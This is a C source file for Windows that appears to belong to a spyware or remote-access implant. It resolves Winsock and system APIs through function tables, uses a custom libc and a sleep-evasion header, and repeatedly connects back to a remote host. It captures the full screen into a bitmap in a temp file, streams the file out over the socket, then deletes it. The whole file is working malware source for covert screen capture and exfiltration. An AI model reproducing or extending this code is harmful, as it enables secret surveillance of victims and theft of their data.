#include "pch.h"
#include "framework.h"
#include "utils.h"
#include "utils_headers.h"

#include "headers.h"
#include "sleaping.h"

#include "mylibc.h"

int startup_wsa(winsock_functions_t* ws_funcs)
{
	WSADATA wsa_data;
	int result = 1;
	if ((result = ws_funcs->WSAStartup(MAKEWORD(2, 2), &wsa_data)) != 0)
	{
		return -1;
	}

	return 0;
}

void cleanup_wsa(winsock_functions_t* ws_funcs)
{
	ws_funcs->WSACleanup();
}

SOCKET init_connection(const char* hostname, int port, winsock_functions_t* ws_funcs, kernel32_functions_t* core_funcs)
{
	SOCKET server_socket = INVALID_SOCKET;
	struct sockaddr_in server_addr = { 0 };


	while(1)
	{
		server_socket = ws_funcs->Socket(AF_INET, SOCK_STREAM, 0);
		if (server_socket == INVALID_SOCKET)
		{
			return INVALID_SOCKET;
		}

		server_addr.sin_family = AF_INET;
		server_addr.sin_port = ws_funcs->Htons(port);
		if (ws_funcs->Inet_pton(AF_INET, hostname, &server_addr.sin_addr) <= 0)
		{
			return INVALID_SOCKET;
		}

		if (ws_funcs->Connect(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR)
		{
			ws_funcs->CloseSocket(server_socket);
			core_funcs->Sleep(5000);
			continue;
		}
		break;
	}

	return server_socket;

}

char* create_temp_filename(const char* basename, kernel32_functions_t* kernel_funcs)
{
	DWORD tick_count;
	int result = 0;
	int basename_len = 0;
	char* name = (char*)my_malloc(MAX_NAME_LEN);
	if (!name)
		return NULL;
	
	my_memset(name, 0, MAX_NAME_LEN);

	if ((result = GetTempPathA(MAX_PATH, name)) == 0)
	{
		result = -1;
		goto __cleanup;
	}

	my_strncat(name, basename, my_strlen(basename));


	basename_len = my_strlen(name);
	name[basename_len] = '-';

	tick_count = kernel_funcs->GetTickCount();
	
	my_lltoa(tick_count, name + (basename_len + 1), 10);

	return name;

__cleanup:

	my_free(name);
	return NULL;
}

int capture_screenshot_win32(const char* filename, kernel32_functions_t* kernel32_funcs, user32_functions_t* user32_funcs, gdi32_functions_t* gdi32_funcs)
{
	if (kernel32_funcs == NULL || user32_funcs == NULL || gdi32_funcs == NULL)
	{
		return -1;
	}

	gdi32_functions_t* gdi = gdi32_funcs;
	user32_functions_t* user32 = user32_funcs;
	kernel32_functions_t* kernel32 = kernel32_funcs;

	HDC hdcScreen = NULL;
	HDC hdcMemDC = NULL;
	HBITMAP hBitmap = NULL;
	HGDIOBJ hOldBitmap = NULL;
	BITMAPINFOHEADER bi;

	HANDLE hFile = INVALID_HANDLE_VALUE;
	int success = 0;

	DWORD dwBmpSize = 0;
	DWORD bytesWritten = 0;
	BYTE* lpbitmap = NULL;
	DWORD fileSize = 0;

	// Get Screen DC
	hdcScreen = user32->GetDC(NULL);
	if (!hdcScreen)
	{
		return -1;
	}

	// Create compatible DC
	hdcMemDC = gdi->CreateCompatibleDC(hdcScreen);
	if (!hdcMemDC)
	{
		user32->ReleaseDC(NULL, hdcScreen);
		return -1;
	}

	int screen_width = user32->GetSystemMetrics(SM_CXSCREEN);
	int screen_height = user32->GetSystemMetrics(SM_CYSCREEN);

	// Create compatible bitmap
	hBitmap = gdi->CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
	if (!hBitmap)
	{
		gdi->DeleteDC(hdcMemDC);
		user32->ReleaseDC(NULL, hdcScreen);
		return -1;
	}

	// Select bitmap to MemDC
	hOldBitmap = gdi->SelectObject(hdcMemDC, hBitmap);

	// Copy screen to MemDC
	if (!gdi->BitBlt(hdcMemDC, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY))
	{
		goto cleanup_0;
	}

	ZeroMemory(&bi, sizeof(BITMAPINFOHEADER));
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = screen_width;
	bi.biHeight = -screen_height;  // negative value indicates DIB from top to bottom
	bi.biPlanes = 1;
	bi.biBitCount = 24;  // 24bits color
	bi.biCompression = BI_RGB;

	dwBmpSize = ((screen_width * 24 + 31) / 32) * 4 * screen_height;
	hFile = kernel32->CreateFileA(
		filename,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		goto cleanup_0;
	}

	BITMAPFILEHEADER bmfHeader;
	bmfHeader.bfType = 0x4D42;  // "BM"
	bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
	bmfHeader.bfReserved1 = 0;
	bmfHeader.bfReserved2 = 0;
	bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	// write bmp header
	if (!kernel32->WriteFile(hFile, &bmfHeader, sizeof(BITMAPFILEHEADER), &bytesWritten, NULL))
	{
		goto cleanup;
	}

	// write bitmap info header
	if (!kernel32->WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &bytesWritten, NULL))
	{
		goto cleanup;
	}

	// allocate mem and get bitmap data
	lpbitmap = (BYTE*)VirtualAlloc(NULL, dwBmpSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpbitmap)
	{
		goto cleanup;
	}

	if (!gdi->GetDIBits(hdcScreen, hBitmap, 0, (UINT)screen_height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS))
	{
		goto cleanup;
	}

	if (!kernel32->WriteFile(hFile, lpbitmap, dwBmpSize, &bytesWritten, NULL))
	{
		goto cleanup;
	}

	// Ensure that data is written to the disk
	kernel32->FlushFileBuffers(hFile);

	fileSize = kernel32->GetFileSize(hFile, NULL);

	success = 1;


cleanup:

	if (lpbitmap) VirtualFree(lpbitmap, 0, MEM_RELEASE);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		kernel32->CloseHandle(hFile);
	}

cleanup_0:

	if (hOldBitmap) gdi->SelectObject(hdcMemDC, hOldBitmap);
	if (hBitmap) gdi->DeleteObject(hBitmap);
	if (hdcMemDC) gdi->DeleteDC(hdcMemDC);
	if (hdcScreen) user32->ReleaseDC(NULL, hdcScreen);

	return success ? 0 : -1;
}

int cleanup_temp_file(const char* filename, kernel32_functions_t* kernel_funcs)
{
	int result = 0;
	if (kernel_funcs->DeleteFileA(filename))
		result = 0;
	else
		result = -1;
	my_free((void*)filename);

	return result;
}

int send_data_over_socket(SOCKET socket, const char* buf, SIZE_T size, winsock_functions_t* ws, kernel32_functions_t* kernel32)
{
	int result = 0;
	while (1)
	{
		result = ws->Send(socket, buf, size, 0);
		if (result == SOCKET_ERROR)
		{
			int error = ws->WSAGetLastError();

			if (error == WSAEWOULDBLOCK)
			{
				kernel32->Sleep(10);
				continue;
			}

			return -1;
		}
		else if (result == 0)
		{
			return -1;
		}
		break;

	}
	
	return 0;

}

int send_file_over_socket(SOCKET socket, const char* filepath, winsock_functions_t* ws, kernel32_functions_t* kernel32)
{
	if (ws == NULL || kernel32 == NULL)
		return -1;

	HANDLE hFile = INVALID_HANDLE_VALUE;
	int result = -1;
	int send_result = 0;

	const DWORD BUFFER_SIZE = 64 * 1024;
	BYTE* buffer = NULL;

	DWORD error = 0;

	hFile = kernel32->CreateFileA(
		filepath,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		return -1;
	}

	LARGE_INTEGER file_size = { 0 };
	DWORD file_size_low;
	file_size_low = kernel32->GetFileSize(hFile, NULL);
	if (file_size_low == INVALID_FILE_SIZE)
	{
		kernel32->CloseHandle(hFile);
		return -1;
	}
	file_size.QuadPart = file_size_low;
	UINT64 size_be = my_byteswap_uint64(file_size.QuadPart);

	if (send_data_over_socket(socket, (const char*)&size_be, sizeof(UINT64), ws, kernel32) != 0)
	{
		kernel32->CloseHandle(hFile);
		return -1;
	}


	buffer = (BYTE*)my_malloc(BUFFER_SIZE);
	if (buffer == NULL)
	{
		kernel32->CloseHandle(hFile);
		return -1;
	}

	// set 30s timeout
	//int send_timeout = 30000;
	//ws->setsockopt(socket, SOL_SOCKET, SO_SNDTIMEO, (const char*)&send_timeout, sizeof(send_timeout));

	DWORD bytes_read = 0;
	BOOL read_result = TRUE;
	LONGLONG total_sent = 0;

	while (total_sent < file_size.QuadPart)
	{
		read_result = kernel32->ReadFile(hFile, buffer, BUFFER_SIZE, &bytes_read, NULL);
		if (!read_result || bytes_read == 0)
		{

			DWORD error = kernel32->GetLastError();
			if (error != ERROR_SUCCESS && error != ERROR_HANDLE_EOF)
			{
				result = -1;
				break;
			}

			if (bytes_read == 0)
				break;
		}

		DWORD bytes_to_send = bytes_read;
		DWORD bytes_sent = 0;

		while (bytes_to_send > 0)
		{

			send_result = ws->Send(socket, (const char*)(buffer + bytes_sent), bytes_to_send, 0);
			if (send_result == SOCKET_ERROR)
			{
				int error = ws->WSAGetLastError();

				if (error == WSAEWOULDBLOCK)
				{
					kernel32->Sleep(10);
					continue;
				}

				result = -1;
				goto cleanup;
			}
			else if (send_result == 0)
			{
				result = -1;
				goto cleanup;
			}

			bytes_sent += send_result;
			bytes_to_send -= send_result;
			total_sent += send_result;
		}

	}

	if (total_sent == file_size.QuadPart)
	{
		result = 0;
	}

cleanup:
	//if (socket_was_blocking)
	//{
	//	u_long mode = 0;
	//	BOOL socket_was_blocking = ws->ioctlsocket(socket, FIONBIO, &mode) == SOCKET_ERROR ? FALSE : TRUE;
	//}

	if (buffer)
	{
		my_free(buffer);
	}

	if (hFile != INVALID_HANDLE_VALUE)
	{
		kernel32->CloseHandle(hFile);
	}

	return result;
}
